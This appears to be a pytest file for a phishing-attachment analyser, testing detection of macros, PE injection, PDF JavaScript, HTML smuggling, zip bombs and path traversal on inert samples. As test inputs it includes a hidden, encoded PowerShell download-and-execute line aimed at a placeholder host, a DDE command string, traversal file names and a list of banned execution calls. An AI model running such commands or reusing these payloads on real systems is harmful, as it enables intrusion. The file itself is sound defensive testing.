"""Attachment analyser, exercised ONLY on inert samples built in memory by tests/fixtures.py.

In production this code runs solely inside the no-network container; here it is used as a library on harmless bytes."""
from __future__ import annotations

import base64
import io
import json
import subprocess
import sys
import zipfile
from pathlib import Path

import pytest

import fixtures as F
from pg_re_worker.analyze import analyze_bytes
from pg_re_worker.archives import name_problem
from pg_re_worker.core import Budget, extract_iocs
from pg_re_worker.detect import detect, type_mismatch
from phishguard.sandbox.re_adapter import sanitize_report

ROOT = Path(__file__).resolve().parents[1]


def run(name: str, data: bytes, pw=()) -> dict:
    rep = analyze_bytes(name, data, list(pw), 0, Budget())
    sanitize_report(rep)  # the host-side schema check must accept everything the worker emits
    return rep


def ids(rep: dict) -> set[str]:
    return {b["id"] for b in rep["behaviors"]}


def beh(rep: dict, id_: str) -> dict:
    return next(b for b in rep["behaviors"] if b["id"] == id_)


def walk(rep: dict):
    yield rep
    for c in rep["children"]:
        yield from walk(c)


# ---------------------------------------------------------------- identification
def test_detect_by_content_not_extension():
    assert detect("x.pdf", F.build_pe({"kernel32.dll": ["LoadLibraryA"]}))[0] == "pe"
    assert detect("x.bin", F.build_docx())[0] == "ooxml"
    assert detect("x.bin", F.build_vba_project({"M": "Sub A()\nEnd Sub"}))[0] == "ole"
    assert detect("x.bin", F.build_pdf())[0] == "pdf"
    assert detect("x.bin", F.build_fake_apk())[0] == "apk"
    assert detect("x.bin", b"\x1f\x8b\x08\x00")[0] == "gzip"
    assert detect("a.ps1", b"$x = 1\nWrite-Host $x")[0] == "script"


def test_type_mismatch_rules():
    assert type_mismatch("invoice.pdf", "pe") and type_mismatch("photo.jpg", "script") and type_mismatch("report.docx", "pdf")
    assert not type_mismatch("report.docx", "ooxml") and not type_mismatch("notes.txt", "text") and not type_mismatch("a.doc", "rtf")
    assert not type_mismatch("setup.exe", "pe") and type_mismatch("setup.exe", "script")


def test_executable_named_as_pdf_is_flagged_and_still_analysed():
    rep = run("invoice.pdf", F.build_pe({"kernel32.dll": ["LoadLibraryA"]}))
    assert rep["type_mismatch"] is True and rep["file_type"].startswith("PE32")


# ---------------------------------------------------------------- office
def test_macro_document_findings_have_code_snippets():
    rep = run("report.docm", F.build_docx(vba_modules={"Module1": F.INERT_VBA}))
    assert {"macro.present", "macro.autoexec", "macro.download", "macro.shell_exec"} <= ids(rep)
    assert "AutoOpen" in beh(rep, "macro.autoexec")["snippet"]
    assert beh(rep, "macro.download")["snippet_kind"] == "vba" and "URLDownloadToFileA" in beh(rep, "macro.download")["snippet"]
    assert any("example.invalid/test/payload.exe" in u for u in rep["iocs"]["urls"])
    assert rep["macros"] and "AutoOpen" in rep["macros"][0]["excerpt"]


def test_plain_docx_without_macros_is_clean():
    rep = run("letter.docx", F.build_docx())
    assert rep["behaviors"] == [] and not rep["type_mismatch"]


def test_remote_template_and_dde_are_found():
    assert "office.remote_template" in ids(run("a.docx", F.build_docx(remote_template="http://example.invalid/t.dotm")))
    rep = run("b.docx", F.build_docx(remote_template="http://example.invalid/t.dotm"))
    assert any("example.invalid" in u for u in rep["iocs"]["urls"])
    assert "office.dde" in ids(run("c.docx", F.build_docx(dde='"cmd.exe" "/c calc.exe"')))


def test_legacy_ole_with_macro_project():
    rep = run("old.doc", F.build_vba_project({"Module1": F.INERT_VBA}))
    assert "macro.autoexec" in ids(rep) and "macro.download" in ids(rep)


# ---------------------------------------------------------------- PE
def test_pe_injection_imports_give_disassembly_at_call_site():
    rep = run("x.exe", F.build_pe({"kernel32.dll": ["VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread", "OpenProcess"]}))
    b = beh(rep, "pe.process_injection")
    assert b["severity"] == "critical" and b["snippet_kind"] == "imports+disasm"
    assert "call dword ptr [" in b["snippet"] and "=>" in b["snippet"]
    assert any("writeprocessmemory" in i.lower() for i in (x.lower() for x in rep["imports"]))


def test_pe_download_and_exec():
    rep = run("x.exe", F.build_pe({"urlmon.dll": ["URLDownloadToFileA"], "shell32.dll": ["ShellExecuteA"]}))
    assert beh(rep, "pe.download_exec")["severity"] == "high"


def test_benign_looking_pe_stays_quiet():
    rep = run("hello.exe", F.build_pe({"kernel32.dll": ["ExitProcess", "GetStdHandle", "WriteFile", "GetLastError", "CloseHandle",
                                                          "GetCommandLineA", "HeapAlloc", "HeapFree"]}))
    assert not ({"pe.process_injection", "pe.download_exec", "pe.minimal_imports", "pe.packer_section"} & ids(rep))


def test_packer_sections_and_minimal_imports():
    rep = run("p.exe", F.build_pe({"kernel32.dll": ["LoadLibraryA", "GetProcAddress"]}, section_names=("UPX0", "UPX1"), text_flags=0xE0000020))
    assert {"pe.packer_section", "pe.wx_section", "pe.minimal_imports"} <= ids(rep) and rep["packed"] is True
    assert "UPX0" in beh(rep, "pe.packer_section")["snippet"]


def test_truncated_pe_does_not_crash():
    data = F.build_pe({"kernel32.dll": ["LoadLibraryA"]})
    rep = run("cut.exe", data[:300])
    assert rep["sha256"] and not rep["errors"] or rep["errors"]  # either handled gracefully or reported, never raised


# ---------------------------------------------------------------- PDF / scripts / html / apk / misc
def test_pdf_javascript_openaction_and_link():
    rep = run("doc.pdf", F.build_pdf())
    assert {"pdf.javascript", "pdf.auto_action", "pdf.uri_action"} <= ids(rep)
    assert "app.alert" in beh(rep, "pdf.javascript")["snippet"]
    assert "http://example.invalid/pdf-test" in rep["iocs"]["urls"]


def test_pdf_hex_escaped_keyword_is_still_seen():
    rep = run("doc.pdf", F.build_pdf(obfuscate=True))
    assert "pdf.obfuscated_names" in ids(rep) and "pdf.javascript" in ids(rep)


def test_pdf_link_only_is_low_risk():
    rep = run("pic.pdf", F.build_pdf(js=None))
    assert ids(rep) == {"pdf.uri_action"} and beh(rep, "pdf.uri_action")["severity"] == "low"


def test_powershell_encoded_command_is_decoded_statically():
    inner = "Write-Host 'harmless'; (New-Object Net.WebClient).DownloadString('http://example.invalid/stage2.ps1') | IEX"
    enc = base64.b64encode(inner.encode("utf-16le")).decode()
    rep = run("run.ps1", f"powershell -NoP -W Hidden -EncodedCommand {enc}\n".encode())
    b = beh(rep, "script.encoded_command")
    assert "--- decoded command ---" in b["snippet"] and "DownloadString" in b["snippet"]
    assert {"script.download_exec", "script.defense_evasion"} <= ids(rep) or "script.download" in ids(rep)
    assert any("example.invalid/stage2.ps1" in u for u in rep["iocs"]["urls"])


def test_html_smuggling_and_password_form():
    html = (b"<html><body><form action='http://example.invalid/post'><input type='password' name='p'></form>"
            b"<script>var b=new Blob([atob('AAAA')]);var a=document.createElement('a');a.download='invoice.zip';</script></body></html>")
    rep = run("invoice.html", html)
    assert {"html.password_form", "html.smuggling", "html.external_form"} <= ids(rep)


def test_plain_text_and_plain_html_are_not_flagged():
    assert run("a.txt", b"Hi, see you at lunch tomorrow. Thanks!")["behaviors"] == []
    assert run("a.html", b"<html><body><p>Hello</p></body></html>")["behaviors"] == []


def test_apk_manifest_and_dex_analysis():
    rep = run("update.apk", F.build_fake_apk())
    assert {"apk.sms_read", "apk.sms_interceptor", "apk.overlay", "apk.dex_sms_api", "apk.dex_dynamic_load"} <= ids(rep)
    assert "android.permission.READ_SMS" in beh(rep, "apk.sms_read")["snippet"]
    assert "Bytecode was not decompiled" in beh(rep, "apk.dex_sms_api")["detail"]


def test_image_with_appended_payload():
    png = b"\x89PNG\r\n\x1a\n" + b"\x00\x00\x00\rIHDR" + b"\x00" * 17 + b"\x00\x00\x00\x00IEND\xaeB`\x82"
    rep = run("pic.png", png + b"MZ" + b"\x00" * 700)
    assert beh(rep, "image.trailing_data")["severity"] == "high"
    assert run("pic.png", png)["behaviors"] == []


# ---------------------------------------------------------------- archives: unpacking safely
def test_zip_children_are_analysed_in_memory():
    pe = F.build_pe({"urlmon.dll": ["URLDownloadToFileA"], "shell32.dll": ["ShellExecuteA"]})
    rep = run("docs.zip", F.zip_bytes({"readme.txt": b"hi", "invoice.exe": pe}))
    kids = {c["filename"]: c for c in rep["children"]}
    assert "pe.download_exec" in ids(kids["invoice.exe"]) and "archive.executable_member" in ids(rep)


def test_path_traversal_is_reported_and_nothing_is_written(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    data = F.zip_bytes({"../../evil.txt": b"x", "/etc/cron.d/x": b"y", "C:/Windows/x.dll": b"z", "ok/fine.txt": b"w"})
    rep = run("t.zip", data)
    b = beh(rep, "archive.path_traversal")
    assert b["severity"] == "high" and "path traversal" in b["snippet"] and "absolute path" in b["snippet"]
    assert list(tmp_path.rglob("*")) == [] and not Path("/etc/cron.d/x").exists()


@pytest.mark.parametrize("name,bad", [("a/b.txt", False), ("../x", True), ("a/../../x", True), ("/abs", True), ("\\\\srv\\share", True),
                                      ("C:\\x", True), ("a\x00b", True), ("name\u202etxt.exe", True), ("..hidden/ok", False), ("a..b/c", False)])
def test_name_problem(name, bad):
    assert bool(name_problem(name)) is bad


def test_zip_bomb_is_refused_before_expansion():
    bomb = F.zip_bytes({"zeros.bin": b"\x00" * (96 << 20)})  # ~96 MB of zeros compresses to ~100 KB
    assert len(bomb) < 400_000
    budget = Budget()
    rep = analyze_bytes("bomb.zip", bomb, [], 0, budget)
    assert beh(rep, "archive.zip_bomb")["severity"] == "high" and rep["children"] == []
    assert budget.bytes_processed < 1 << 20  # nothing was expanded


def test_nesting_depth_is_capped():
    data = b"final payload text"
    for i in range(8):
        data = F.zip_bytes({f"level{i}.zip": data})
    rep = run("matryoshka.zip", data)
    depth = max(len(list(_chain(rep))) for _ in [0])
    assert depth <= 6 and any("maximum nesting depth" in w for r in walk(rep) for w in r["warnings"])


def _chain(rep):
    while True:
        yield rep
        if not rep["children"]:
            return
        rep = rep["children"][0]


def test_encrypted_member_with_message_password_and_without():
    data = F.zip_bytes({"secret.txt": b"hello"}, flag_encrypted={"secret.txt"})
    rep = run("inv.zip", data, pw=["infected"])
    assert rep["encrypted"] is True and rep["children"] == []  # bytes aren't really encrypted -> wrong-password path, no crash
    assert any("could not decrypt" in w for w in rep["warnings"])


def test_member_count_and_size_limits():
    many = F.zip_bytes({f"f{i}.txt": b"x" for i in range(60)})
    rep = run("many.zip", many)
    assert len(rep["children"]) <= 25 and any("first 25 members" in w for w in rep["warnings"])


def test_gzip_wrapper_and_decompression_cap():
    import gzip

    rep = run("note.txt.gz", gzip.compress(b"hello http://example.invalid/x"))
    assert rep["children"] and rep["children"][0]["filename"] == "note.txt"
    big = gzip.compress(b"\x00" * (40 << 20))
    rep = run("bomb.gz", big)
    assert "archive.zip_bomb" in ids(rep) and rep["children"] == []


# ---------------------------------------------------------------- indicators
def test_ioc_extraction():
    t = ("see http://203.0.113.9:8080/a.exe and hxxp no. Mail bad@evil-example.com. HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\x "
         "C:\\Users\\Public\\p.exe cmd.exe /c whoami version 1.2.3.4")
    i = extract_iocs(t)
    assert "http://203.0.113.9:8080/a.exe" in i["urls"] and "203.0.113.9" in i["ips"]
    assert "bad@evil-example.com" in i["emails"] and i["registry"] and i["paths"] and i["commands"]
    assert extract_iocs("version 1.2.3.4 and 10.0.0.5", binary=True)["ips"] == []  # no context -> not an indicator in binaries
    assert "10.0.0.5" not in extract_iocs(t)["ips"]


# ---------------------------------------------------------------- protocol & containment properties
def test_entrypoint_protocol_end_to_end():
    payload = json.dumps({"filename": "a.txt", "passwords": []}).encode() + b"\n" + b"hello http://example.invalid/z"
    p = subprocess.run([sys.executable, "-I", "-m", "pg_re_worker"], input=payload, capture_output=True, cwd=ROOT / "src", timeout=60)
    assert p.returncode == 0, p.stderr
    rep = json.loads(p.stdout)
    assert rep["filename"] == "a.txt" and "http://example.invalid/z" in rep["iocs"]["urls"]
    bad = subprocess.run([sys.executable, "-I", "-m", "pg_re_worker"], input=b"not json\n", capture_output=True, cwd=ROOT / "src", timeout=60)
    assert bad.returncode == 2


def test_host_application_never_imports_the_worker():
    """The app must reach attachment analysis only through the container adapter, never by importing the analyser."""
    for py in (ROOT / "src" / "phishguard").rglob("*.py"):
        text = py.read_text(encoding="utf-8")
        assert "import pg_re_worker" not in text and "from pg_re_worker" not in text, py


def test_worker_never_executes_or_spawns():
    banned = ("subprocess", "os.system", "os.popen", "exec(", "eval(", "ctypes", "socket", "urllib.request", "requests", "importlib.import_module")
    for py in (ROOT / "src" / "pg_re_worker").glob("*.py"):
        text = py.read_text(encoding="utf-8")
        # the regex *patterns* mention eval( etc. as text to look for; only flag real call sites on the worker itself
        for b in banned:
            for n, line in enumerate(text.splitlines(), 1):
                code = line.split("#")[0]
                if b in code and not any(q in code for q in ('"', "'", "r\"", "re.compile")):
                    pytest.fail(f"{py.name}:{n} uses {b}: {line.strip()}")


def test_worker_report_always_passes_host_schema():
    for name, data in [("a.docm", F.build_docx(vba_modules={"Module1": F.INERT_VBA})), ("b.exe", F.build_pe({"kernel32.dll": ["LoadLibraryA"]})),
                       ("c.pdf", F.build_pdf()), ("d.apk", F.build_fake_apk()), ("e.zip", F.zip_bytes({"x": b"y"})), ("f.bin", bytes(range(256)) * 40)]:
        rep = sanitize_report(analyze_bytes(name, data, [], 0, Budget()))
        assert isinstance(rep["behaviors"], list) and rep["sha256"]
